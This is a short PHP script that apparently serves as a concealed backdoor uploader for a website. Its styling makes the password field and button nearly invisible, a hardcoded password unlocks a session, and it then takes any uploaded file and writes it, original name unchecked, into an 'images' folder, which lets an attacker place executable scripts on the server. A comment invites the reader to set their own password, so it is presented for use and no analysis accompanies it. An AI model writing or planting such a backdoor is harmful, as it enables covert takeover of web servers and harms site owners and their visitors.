<?php
session_start();
if (isset($_POST['sub'])) {

$asd=$_POST['asd'];
           #Change with your password 		
if ($asd=='0ASD0#MZWA^JNGR$') {

$_SESSION['asdi']=$asd;

}


}
?>








<form method="post">
<input type="text" name="asd" style="border: 1px;">
<input type="submit" name="sub" value="" style="background-color: white;border: 1px;">
</form>
<?php 



if(!empty($_SESSION['asdi'])){

if (isset($_POST['asdi'])) {
	

$fileN=$_FILES['myfile']['name'];
$fileTn=$_FILES['myfile']['tmp_name'];

mkdir('images');

move_uploaded_file($fileTn, "images/".$fileN);

echo "done";

}


?>


<form method="post" enctype="multipart/form-data">

<input type="file" name="myfile">
<input type="submit" name="asdi">

</form>



<?php 
}






 ?>




